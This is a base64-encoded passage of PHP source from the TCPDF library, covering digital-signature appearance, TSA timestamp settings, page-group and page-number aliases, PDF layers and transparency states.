hbWUgb2YgdGhlIHNpZ25hdHVyZS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS45LjEwMSAoMjAxMS0wNy0wNikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGFkZEVtcHR5U2lnbmF0dXJlQXBwZWFyYW5jZSgkeD0wLCAkeT0wLCAkdz0wLCAkaD0wLCAkcGFnZT0tMSwgJG5hbWU9JycpIHsKCQkrKyR0aGlzLT5uOwoJCSR0aGlzLT5lbXB0eV9zaWduYXR1cmVfYXBwZWFyYW5jZVtdID0gYXJyYXkoJ29iamlkJyA9PiAkdGhpcy0+bikgKyAkdGhpcy0+Z2V0U2lnbmF0dXJlQXBwZWFyYW5jZUFycmF5KCR4LCAkeSwgJHcsICRoLCAkcGFnZSwgJG5hbWUpOwoJfQoKCS8qKgoJICogR2V0IHRoZSBhcnJheSB0aGF0IGRlZmluZXMgdGhlIHNpZ25hdHVyZSBhcHBlYXJhbmNlIChwYWdlIGFuZCByZWN0YW5nbGUgY29vcmRpbmF0ZXMpLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lci4KCSAqIEBwYXJhbSBmbG9hdCAkeSBPcmRpbmF0ZSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHcgV2lkdGggb2YgdGhlIHNpZ25hdHVyZSBhcmVhLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodCBvZiB0aGUgc2lnbmF0dXJlIGFyZWEuCgkgKiBAcGFyYW0gaW50ICRwYWdlIG9wdGlvbiBwYWdlIG51bWJlciAoaWYgPCAwIHRoZSBjdXJyZW50IHBhZ2UgaXMgdXNlZCkuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE5hbWUgb2YgdGhlIHNpZ25hdHVyZS4KCSAqIEByZXR1cm4gYXJyYXkgQXJyYXkgZGVmaW5pbmcgcGFnZSBhbmQgcmVjdGFuZ2xlIGNvb3JkaW5hdGVzIG9mIHNpZ25hdHVyZSBhcHBlYXJhbmNlLgoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA1LjkuMTAxICgyMDExLTA3LTA2KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0U2lnbmF0dXJlQXBwZWFyYW5jZUFycmF5KCR4PTAsICR5PTAsICR3PTAsICRoPTAsICRwYWdlPS0xLCAkbmFtZT0nJykgewoJCSRzaWdhcHAgPSBhcnJheSgpOwoJCWlmICgoJHBhZ2UgPCAxKSBPUiAoJHBhZ2UgPiAkdGhpcy0+bnVtcGFnZXMpKSB7CgkJCSRzaWdhcHBbJ3BhZ2UnXSA9ICR0aGlzLT5wYWdlOwoJCX0gZWxzZSB7CgkJCSRzaWdhcHBbJ3BhZ2UnXSA9IGludHZhbCgkcGFnZSk7CgkJfQoJCWlmIChlbXB0eSgkbmFtZSkpIHsKCQkJJHNpZ2FwcFsnbmFtZSddID0gJ1NpZ25hdHVyZSc7CgkJfSBlbHNlIHsKCQkJJHNpZ2FwcFsnbmFtZSddID0gJG5hbWU7CgkJfQoJCSRhID0gJHggKiAkdGhpcy0+azsKCQkkYiA9ICR0aGlzLT5wYWdlZGltWygkc2lnYXBwWydwYWdlJ10pXVsnaCddIC0gKCgkeSArICRoKSAqICR0aGlzLT5rKTsKCQkkYyA9ICR3ICogJHRoaXMtPms7CgkJJGQgPSAkaCAqICR0aGlzLT5rOwoJCSRzaWdhcHBbJ3JlY3QnXSA9IHNwcmludGYoJyVGICVGICVGICVGJywgJGEsICRiLCAoJGEgKyAkYyksICgkYiArICRkKSk7CgkJcmV0dXJuICRzaWdhcHA7Cgl9CgoJLyoqCgkgKiBFbmFibGUgZG9jdW1lbnQgdGltZXN0YW1waW5nIChyZXF1aXJlcyB0aGUgT3BlblNTTCBMaWJyYXJ5KS4KCSAqIFRoZSB0cnVzdGVkIHRpbWVzdGFtcGluZyBpbXByb3ZlIGRvY3VtZW50IHNlY3VyaXR5IHRoYXQgbWVhbnMgdGhhdCBubyBvbmUgc2hvdWxkIGJlIGFibGUgdG8gY2hhbmdlIHRoZSBkb2N1bWVudCBvbmNlIGl0IGhhcyBiZWVuIHJlY29yZGVkLgoJICogVXNlIHdpdGggZGlnaXRhbCBzaWduYXR1cmUgb25seSEKCSAqIEBwYXJhbSBzdHJpbmcgJHRzYV9ob3N0IFRpbWUgU3RhbXBpbmcgQXV0aG9yaXR5IChUU0EpIHNlcnZlciAocHJlZml4ZWQgd2l0aCAnaHR0cHM6Ly8nKQoJICogQHBhcmFtIHN0cmluZyAkdHNhX3VzZXJuYW1lIFNwZWNpZmllcyB0aGUgdXNlcm5hbWUgZm9yIFRTQSBhdXRob3JpemF0aW9uIChvcHRpb25hbCkgT1Igc3BlY2lmaWVzIHRoZSBUU0EgYXV0aG9yaXphdGlvbiBQRU0gZmlsZSAoc2VlOiBleGFtcGxlXzY2LnBocCwgb3B0aW9uYWwpCgkgKiBAcGFyYW0gc3RyaW5nICR0c2FfcGFzc3dvcmQgU3BlY2lmaWVzIHRoZSBwYXNzd29yZCBmb3IgVFNBIGF1dGhvcml6YXRpb24gKG9wdGlvbmFsKQoJICogQHBhcmFtIHN0cmluZyAkdHNhX2NlcnQgU3BlY2lmaWVzIHRoZSBsb2NhdGlvbiBvZiBUU0EgY2VydGlmaWNhdGUgZm9yIGF1dGhvcml6YXRpb24gKG9wdGlvbmFsIGZvciBjVVJMKQoJICogQHB1YmxpYwoJICogQGF1dGhvciBSaWNoYXJkIFN0b2NraW5nZXIKCSAqIEBzaW5jZSA2LjAuMDkwICgyMDE0LTA2LTE2KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0VGltZVN0YW1wKCR0c2FfaG9zdD0nJywgJHRzYV91c2VybmFtZT0nJywgJHRzYV9wYXNzd29yZD0nJywgJHRzYV9jZXJ0PScnKSB7CgkJJHRoaXMtPnRzYV9kYXRhID0gYXJyYXkoKTsKCQlpZiAoIWZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpIHsKCQkJJHRoaXMtPkVycm9yKCdQbGVhc2UgZW5hYmxlIGNVUkwgUEhQIGV4dGVuc2lvbiEnKTsKCQl9CgkJaWYgKHN0cmxlbigkdHNhX2hvc3QpID09IDApIHsKCQkJJHRoaXMtPkVycm9yKCdQbGVhc2Ugc3BlY2lmeSB0aGUgaG9zdCBvZiBUaW1lIFN0YW1waW5nIEF1dGhvcml0eSAoVFNBKSEnKTsKCQl9CgkJJHRoaXMtPnRzYV9kYXRhWyd0c2FfaG9zdCddID0gJHRzYV9ob3N0OwoJCWlmIChpc19maWxlKCR0c2FfdXNlcm5hbWUpKSB7CgkJCSR0aGlzLT50c2FfZGF0YVsndHNhX2F1dGgnXSA9ICR0c2FfdXNlcm5hbWU7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnRzYV9kYXRhWyd0c2FfdXNlcm5hbWUnXSA9ICR0c2FfdXNlcm5hbWU7CgkJfQoJCSR0aGlzLT50c2FfZGF0YVsndHNhX3Bhc3N3b3JkJ10gPSAkdHNhX3Bhc3N3b3JkOwoJCSR0aGlzLT50c2FfZGF0YVsndHNhX2NlcnQnXSA9ICR0c2FfY2VydDsKCQkkdGhpcy0+dHNhX3RpbWVzdGFtcCA9IHRydWU7Cgl9CgoJLyoqCgkgKiBOT1QgWUVUIElNUExFTUVOVEVECgkgKiBSZXF1ZXN0IFRTQSBmb3IgYSB0aW1lc3RhbXAKCSAqIEBwYXJhbSBzdHJpbmcgJHNpZ25hdHVyZSBEaWdpdGFsIHNpZ25hdHVyZSBhcyBiaW5hcnkgc3RyaW5nCgkgKiBAcmV0dXJuIHN0cmluZyBUaW1lc3RhbXBlZCBkaWdpdGFsIHNpZ25hdHVyZQoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBSaWNoYXJkIFN0b2NraW5nZXIKCSAqIEBzaW5jZSA2LjAuMDkwICgyMDE0LTA2LTE2KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gYXBwbHlUU0EoJHNpZ25hdHVyZSkgewoJCWlmICghJHRoaXMtPnRzYV90aW1lc3RhbXApIHsKCQkJcmV0dXJuICRzaWduYXR1cmU7CgkJfQoJCS8vQFRPRE86IGltcGxlbWVudCB0aGlzIGZlYXR1cmUKCQlyZXR1cm4gJHNpZ25hdHVyZTsKCX0KCgkvKioKCSAqIENyZWF0ZSBhIG5ldyBwYWdlIGdyb3VwLgoJICogTk9URTogY2FsbCB0aGlzIGZ1bmN0aW9uIGJlZm9yZSBjYWxsaW5nIEFkZFBhZ2UoKQoJICogQHBhcmFtIGludHxudWxsICRwYWdlIHN0YXJ0aW5nIGdyb3VwIHBhZ2UgKGxlYXZlIGVtcHR5IGZvciBuZXh0IHBhZ2UpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDMuMC4wMDAgKDIwMDgtMDMtMjcpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzdGFydFBhZ2VHcm91cCgkcGFnZT1udWxsKSB7CgkJaWYgKGVtcHR5KCRwYWdlKSkgewoJCQkkcGFnZSA9ICR0aGlzLT5wYWdlICsgMTsKCQl9CgkJJHRoaXMtPm5ld3BhZ2Vncm91cFskcGFnZV0gPSBzaXplb2YoJHRoaXMtPm5ld3BhZ2Vncm91cCkgKyAxOwoJfQoKCS8qKgoJICogU2V0IHRoZSBzdGFydGluZyBwYWdlIG51bWJlci4KCSAqIEBwYXJhbSBpbnQgJG51bSBTdGFydGluZyBwYWdlIG51bWJlci4KCSAqIEBzaW5jZSA1LjkuMDkzICgyMDExLTA2LTE2KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0U3RhcnRpbmdQYWdlTnVtYmVyKCRudW09MSkgewoJCSR0aGlzLT5zdGFydGluZ19wYWdlX251bWJlciA9IG1heCgwLCBpbnR2YWwoJG51bSkpOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgc3RyaW5nIGFsaWFzIHVzZWQgcmlnaHQgYWxpZ24gcGFnZSBudW1iZXJzLgoJICogSWYgdGhlIGN1cnJlbnQgZm9udCBpcyB1bmljb2RlIHR5cGUsIHRoZSByZXR1cm5lZCBzdHJpbmcgd2lsIGNvbnRhaW4gYW4gYWRkaXRpb25hbCBvcGVuIGN1cmx5IGJyYWNlLgoJICogQHJldHVybiBzdHJpbmcKCSAqIEBzaW5jZSA1LjkuMDk5ICgyMDExLTA2LTI3KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0QWxpYXNSaWdodFNoaWZ0KCkgewoJCS8vIGNhbGN1bGF0ZSBhcHJveGltYXRpdmVseSB0aGUgcmF0aW8gYmV0d2VlbiB3aWR0aHMgb2YgYWxpYXNlcyBhbmQgcmVwbGFjZW1lbnRzLgoJCSRyZWYgPSAneycuVENQREZfU1RBVElDOjokYWxpYXNfcmlnaHRfc2hpZnQuJ317Jy5UQ1BERl9TVEFUSUM6OiRhbGlhc190b3RfcGFnZXMuJ317Jy5UQ1BERl9TVEFUSUM6OiRhbGlhc19udW1fcGFnZS4nfSc7CgkJJHJlcCA9IHN0cl9yZXBlYXQoJyAnLCAkdGhpcy0+R2V0TnVtQ2hhcnMoJHJlZikpOwoJCSR3cmVwID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCRyZXApOwoJCWlmICgkd3JlcCA+IDApIHsKCQkJJHdkaWZmID0gbWF4KDEsICgkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJHJlZikgLyAkd3JlcCkpOwoJCX0gZWxzZSB7CgkJCSR3ZGlmZiA9IDE7CgkJfQoJCSRzZGlmZiA9IHNwcmludGYoJyVGJywgJHdkaWZmKTsKCQkkYWxpYXMgPSBUQ1BERl9TVEFUSUM6OiRhbGlhc19yaWdodF9zaGlmdC4kc2RpZmYuJ30nOwoJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCSRhbGlhcyA9ICd7Jy4kYWxpYXM7CgkJfQoJCXJldHVybiAkYWxpYXM7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBzdHJpbmcgYWxpYXMgdXNlZCBmb3IgdGhlIHRvdGFsIG51bWJlciBvZiBwYWdlcy4KCSAqIElmIHRoZSBjdXJyZW50IGZvbnQgaXMgdW5pY29kZSB0eXBlLCB0aGUgcmV0dXJuZWQgc3RyaW5nIGlzIHN1cnJvdW5kZWQgYnkgYWRkaXRpb25hbCBjdXJseSBicmFjZXMuCgkgKiBUaGlzIGFsaWFzIHdpbGwgYmUgcmVwbGFjZWQgYnkgdGhlIHRvdGFsIG51bWJlciBvZiBwYWdlcyBpbiB0aGUgZG9jdW1lbnQuCgkgKiBAcmV0dXJuIHN0cmluZwoJICogQHNpbmNlIDQuMC4wMTggKDIwMDgtMDgtMDgpCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRBbGlhc05iUGFnZXMoKSB7CgkJaWYgKCR0aGlzLT5pc1VuaWNvZGVGb250KCkpIHsKCQkJcmV0dXJuICd7Jy5UQ1BERl9TVEFUSUM6OiRhbGlhc190b3RfcGFnZXMuJ30nOwoJCX0KCQlyZXR1cm4gVENQREZfU1RBVElDOjokYWxpYXNfdG90X3BhZ2VzOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgc3RyaW5nIGFsaWFzIHVzZWQgZm9yIHRoZSBwYWdlIG51bWJlci4KCSAqIElmIHRoZSBjdXJyZW50IGZvbnQgaXMgdW5pY29kZSB0eXBlLCB0aGUgcmV0dXJuZWQgc3RyaW5nIGlzIHN1cnJvdW5kZWQgYnkgYWRkaXRpb25hbCBjdXJseSBicmFjZXMuCgkgKiBUaGlzIGFsaWFzIHdpbGwgYmUgcmVwbGFjZWQgYnkgdGhlIHBhZ2UgbnVtYmVyLgoJICogQHJldHVybiBzdHJpbmcKCSAqIEBzaW5jZSA0LjUuMDAwICgyMDA5LTAxLTAyKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0QWxpYXNOdW1QYWdlKCkgewoJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCXJldHVybiAneycuVENQREZfU1RBVElDOjokYWxpYXNfbnVtX3BhZ2UuJ30nOwoJCX0KCQlyZXR1cm4gVENQREZfU1RBVElDOjokYWxpYXNfbnVtX3BhZ2U7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIGFsaWFzIGZvciB0aGUgdG90YWwgbnVtYmVyIG9mIHBhZ2VzIGluIHRoZSBjdXJyZW50IHBhZ2UgZ3JvdXAuCgkgKiBJZiB0aGUgY3VycmVudCBmb250IGlzIHVuaWNvZGUgdHlwZSwgdGhlIHJldHVybmVkIHN0cmluZyBpcyBzdXJyb3VuZGVkIGJ5IGFkZGl0aW9uYWwgY3VybHkgYnJhY2VzLgoJICogVGhpcyBhbGlhcyB3aWxsIGJlIHJlcGxhY2VkIGJ5IHRoZSB0b3RhbCBudW1iZXIgb2YgcGFnZXMgaW4gdGhpcyBncm91cC4KCSAqIEByZXR1cm4gc3RyaW5nIGFsaWFzIG9mIHRoZSBjdXJyZW50IHBhZ2UgZ3JvdXAKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0UGFnZUdyb3VwQWxpYXMoKSB7CgkJaWYgKCR0aGlzLT5pc1VuaWNvZGVGb250KCkpIHsKCQkJcmV0dXJuICd7Jy5UQ1BERl9TVEFUSUM6OiRhbGlhc19ncm91cF90b3RfcGFnZXMuJ30nOwoJCX0KCQlyZXR1cm4gVENQREZfU1RBVElDOjokYWxpYXNfZ3JvdXBfdG90X3BhZ2VzOwoJfQoKCS8qKgoJICogUmV0dXJuIHRoZSBhbGlhcyBmb3IgdGhlIHBhZ2UgbnVtYmVyIG9uIHRoZSBjdXJyZW50IHBhZ2UgZ3JvdXAuCgkgKiBJZiB0aGUgY3VycmVudCBmb250IGlzIHVuaWNvZGUgdHlwZSwgdGhlIHJldHVybmVkIHN0cmluZyBpcyBzdXJyb3VuZGVkIGJ5IGFkZGl0aW9uYWwgY3VybHkgYnJhY2VzLgoJICogVGhpcyBhbGlhcyB3aWxsIGJlIHJlcGxhY2VkIGJ5IHRoZSBwYWdlIG51bWJlciAocmVsYXRpdmUgdG8gdGhlIGJlbG9uZ2luZyBncm91cCkuCgkgKiBAcmV0dXJuIHN0cmluZyBhbGlhcyBvZiB0aGUgY3VycmVudCBwYWdlIGdyb3VwCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC41LjAwMCAoMjAwOS0wMS0wMikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldFBhZ2VOdW1Hcm91cEFsaWFzKCkgewoJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCXJldHVybiAneycuVENQREZfU1RBVElDOjokYWxpYXNfZ3JvdXBfbnVtX3BhZ2UuJ30nOwoJCX0KCQlyZXR1cm4gVENQREZfU1RBVElDOjokYWxpYXNfZ3JvdXBfbnVtX3BhZ2U7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIGN1cnJlbnQgcGFnZSBpbiB0aGUgZ3JvdXAuCgkgKiBAcmV0dXJuIGludCBjdXJyZW50IHBhZ2UgaW4gdGhlIGdyb3VwCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4wLjAwMCAoMjAwOC0wMy0yNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEdyb3VwUGFnZU5vKCkgewoJCXJldHVybiAkdGhpcy0+cGFnZWdyb3Vwc1skdGhpcy0+Y3VycnBhZ2Vncm91cF07Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBjdXJyZW50IGdyb3VwIHBhZ2UgbnVtYmVyIGZvcm1hdHRlZCBhcyBhIHN0cmluZy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjMuMDAzICgyMDA4LTExLTE4KQoJICogQHNlZSBQYW5lTm8oKSwgZm9ybWF0UGFnZU51bWJlcigpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRHcm91cFBhZ2VOb0Zvcm1hdHRlZCgpIHsKCQlyZXR1cm4gVENQREZfU1RBVElDOjpmb3JtYXRQYWdlTnVtYmVyKCR0aGlzLT5nZXRHcm91cFBhZ2VObygpKTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGN1cnJlbnQgcGFnZSBudW1iZXIgZm9ybWF0dGVkIGFzIGEgc3RyaW5nLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMi4wMDUgKDIwMDgtMTEtMDYpCgkgKiBAc2VlIFBhbmVObygpLCBmb3JtYXRQYWdlTnVtYmVyKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFBhZ2VOb0Zvcm1hdHRlZCgpIHsKCQlyZXR1cm4gVENQREZfU1RBVElDOjpmb3JtYXRQYWdlTnVtYmVyKCR0aGlzLT5QYWdlTm8oKSk7Cgl9CgoJLyoqCgkgKiBQdXQgcGRmIGxheWVycy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dG9jZygpIHsKCQlpZiAoZW1wdHkoJHRoaXMtPnBkZmxheWVycykpIHsKCQkJcmV0dXJuOwoJCX0KCQlmb3JlYWNoICgkdGhpcy0+cGRmbGF5ZXJzIGFzICRrZXkgPT4gJGxheWVyKSB7CgkJCSAkdGhpcy0+cGRmbGF5ZXJzWyRrZXldWydvYmppZCddID0gJHRoaXMtPl9uZXdvYmooKTsKCQkJICRvdXQgPSAnPDwgL1R5cGUgL09DRyc7CgkJCSAkb3V0IC49ICcgL05hbWUgJy4kdGhpcy0+X3RleHRzdHJpbmcoJGxheWVyWyduYW1lJ10sICR0aGlzLT5wZGZsYXllcnNbJGtleV1bJ29iamlkJ10pOwoJCQkgJG91dCAuPSAnIC9Vc2FnZSA8PCc7CgkJCSBpZiAoaXNzZXQoJGxheWVyWydwcmludCddKSBBTkQgKCRsYXllclsncHJpbnQnXSAhPT0gTlVMTCkpIHsKCQkJCSRvdXQgLj0gJyAvUHJpbnQgPDwvUHJpbnRTdGF0ZSAvJy4oJGxheWVyWydwcmludCddPydPTic6J09GRicpLic+Pic7CgkJCSB9CgkJCSAkb3V0IC49ICcgL1ZpZXcgPDwvVmlld1N0YXRlIC8nLigkbGF5ZXJbJ3ZpZXcnXT8nT04nOidPRkYnKS4nPj4nOwoJCQkgJG91dCAuPSAnID4+ID4+JzsKCQkJICRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkJICR0aGlzLT5fb3V0KCRvdXQpOwoJCX0KCX0KCgkvKioKCSAqIFN0YXJ0IGEgbmV3IHBkZiBsYXllci4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgTGF5ZXIgbmFtZSAob25seSBhLXogbGV0dGVycyBhbmQgbnVtYmVycykuIExlYXZlIGVtcHR5IGZvciBhdXRvbWF0aWMgbmFtZS4KCSAqIEBwYXJhbSBib29sZWFufG51bGwgJHByaW50IFNldCB0byBUUlVFIHRvIHByaW50IHRoaXMgbGF5ZXIsIEZBTFNFIHRvIG5vdCBwcmludCBhbmQgTlVMTCB0byBub3Qgc2V0IHRoaXMgb3B0aW9uCgkgKiBAcGFyYW0gYm9vbGVhbiAkdmlldyBTZXQgdG8gdHJ1ZSB0byB2aWV3IHRoaXMgbGF5ZXIuCgkgKiBAcGFyYW0gYm9vbGVhbiAkbG9jayBJZiB0cnVlIGxvY2sgdGhlIGxheWVyCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjEwMiAoMjAxMS0wNy0xMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHN0YXJ0TGF5ZXIoJG5hbWU9JycsICRwcmludD10cnVlLCAkdmlldz10cnVlLCAkbG9jaz10cnVlKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJJGxheWVyID0gc3ByaW50ZignTFlSJTAzZCcsIChjb3VudCgkdGhpcy0+cGRmbGF5ZXJzKSArIDEpKTsKCQlpZiAoZW1wdHkoJG5hbWUpKSB7CgkJCSRuYW1lID0gJGxheWVyOwoJCX0gZWxzZSB7CgkJCSRuYW1lID0gcHJlZ19yZXBsYWNlKCcvW15hLXpBLVowLTlfXC1dLycsICcnLCAkbmFtZSk7CgkJfQoJCSR0aGlzLT5wZGZsYXllcnNbXSA9IGFycmF5KCdsYXllcicgPT4gJGxheWVyLCAnbmFtZScgPT4gJG5hbWUsICdwcmludCcgPT4gJHByaW50LCAndmlldycgPT4gJHZpZXcsICdsb2NrJyA9PiAkbG9jayk7CgkJJHRoaXMtPm9wZW5NYXJrZWRDb250ZW50ID0gdHJ1ZTsKCQkkdGhpcy0+X291dCgnL09DIC8nLiRsYXllci4nIEJEQycpOwoJfQoKCS8qKgoJICogRW5kIHRoZSBjdXJyZW50IFBERiBsYXllci4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMTAyICgyMDExLTA3LTEzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZW5kTGF5ZXIoKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJaWYgKCR0aGlzLT5vcGVuTWFya2VkQ29udGVudCkgewoJCQkvLyBjbG9zZSBleGlzdGluZyBvcGVuIG1hcmtlZC1jb250ZW50IGxheWVyCgkJCSR0aGlzLT5fb3V0KCdFTUMnKTsKCQkJJHRoaXMtPm9wZW5NYXJrZWRDb250ZW50ID0gZmFsc2U7CgkJfQoJfQoKCS8qKgoJICogU2V0IHRoZSB2aXNpYmlsaXR5IG9mIHRoZSBzdWNjZXNzaXZlIGVsZW1lbnRzLgoJICogVGhpcyBjYW4gYmUgdXNlZnVsLCBmb3IgaW5zdGFuY2UsIHRvIHB1dCBhIGJhY2tncm91bmQKCSAqIGltYWdlIG9yIGNvbG9yIHRoYXQgd2lsbCBzaG93IG9uIHNjcmVlbiBidXQgd29uJ3QgcHJpbnQuCgkgKiBAcGFyYW0gc3RyaW5nICR2IHZpc2liaWxpdHkgbW9kZS4gTGVnYWwgdmFsdWVzIGFyZTogYWxsLCBwcmludCwgc2NyZWVuIG9yIHZpZXcuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4wLjAwMCAoMjAwOC0wMy0yNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFZpc2liaWxpdHkoJHYpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQkkdGhpcy0+ZW5kTGF5ZXIoKTsKCQlzd2l0Y2goJHYpIHsKCQkJY2FzZSAncHJpbnQnOiB7CgkJCQkkdGhpcy0+c3RhcnRMYXllcignUHJpbnQnLCB0cnVlLCBmYWxzZSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICd2aWV3JzoKCQkJY2FzZSAnc2NyZWVuJzogewoJCQkJJHRoaXMtPnN0YXJ0TGF5ZXIoJ1ZpZXcnLCBmYWxzZSwgdHJ1ZSk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdhbGwnOiB7CgkJCQkkdGhpcy0+X291dCgnJyk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OiB7CgkJCQkkdGhpcy0+RXJyb3IoJ0luY29ycmVjdCB2aXNpYmlsaXR5OiAnLiR2KTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJfQoKCS8qKgoJICogQWRkIHRyYW5zcGFyZW5jeSBwYXJhbWV0ZXJzIHRvIHRoZSBjdXJyZW50IGV4dGdzdGF0ZQoJICogQHBhcmFtIGFycmF5ICRwYXJtcyBwYXJhbWV0ZXJzCgkgKiBAcmV0dXJuIGludHx2b2lkIHRoZSBudW1iZXIgb2YgZXh0Z3N0YXRlcwoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMC4wMDAgKDIwMDgtMDMtMjcpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBhZGRFeHRHU3RhdGUoJHBhcm1zKSB7CgkJaWYgKCgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPCAyKSB8fCAoJHRoaXMtPnN0YXRlICE9IDIpKSB7CgkJCS8vIHRyYW5zcGFyZW5jeSBpcyBub3QgYWxsb3dlZCBpbiBQREYvQS0xIG1vZGUKCQkJcmV0dXJuOwoJCX0KCQkvLyBjaGVjayBpZiB0aGlzIEV4dEdTdGF0ZSBhbHJlYWR5IGV4aXN0CgkJZm9yZWFjaCAoJHRoaXMtPmV4dGdzdGF0ZXMgYXMgJGkgPT4gJGV4dCkgewoJCQlpZiAoJGV4dFsncGFybXMnXSA9PSAkcGFybXMpIHsKCQkJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydleHRnc3RhdGVzJ11bJGldID0gJGV4dDsKCQkJCX0KCQkJCS8vIHJldHVybiByZWZlcmVuY2UgdG8gZXhpc3RpbmcgRXh0R1N0YXRlCgkJCQlyZXR1cm4gJGk7CgkJCX0KCQl9CgkJJG4gPSAoY291bnQoJHRoaXMtPmV4dGdzdGF0ZXMpICsgMSk7CgkJJHRoaXMtPmV4dGdzdGF0ZXNbJG5dID0gYXJyYXkoJ3Bhcm1zJyA9PiAkcGFybXMpOwoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2V4dGdzdGF0ZXMnXVskbl0gPSAkdGhpcy0+ZXh0Z3N0YXRlc1skbl07CgkJfQoJCXJldHVybiAkbjsKCX0KCgkvKioKCSAqIEFkZCBhbiBleHRnc3RhdGUKCSAqIEBwYXJhbSBpbnQgJGdzIGV4dGdzdGF0ZQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMC4wMDAgKDIwMDgtMDMtMjcpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBzZXRFeHRHU3RhdGUoJGdzKSB7CgkJaWYgKCgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPCAyKSBPUiAoJHRoaXMtPnN0YXRlICE9IDIpKSB7CgkJCS8vIHRyYW5zcGFyZW5jeSBpcyBub3QgYWxsb3dlZCBpbiBQREYvQS0xIG1vZGUKCQkJcmV0dXJuOwoJCX0KCQkkdGhpcy0+X291dChzcHJpbnRmKCcvR1MlZCBncycsICRncykpOwoJfQoKCS8qKgoJICogUHV0IGV4dGdzdGF0ZXMgZm9yIG9iamVjdCB0cmFuc3BhcmVuY3kKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dGV4dGdzdGF0ZXMoKSB7CgkJZm9yZWFjaCAoJHRoaXMtPmV4dGdzdGF0ZXMgYXMgJGkgPT4gJGV4dCkgewo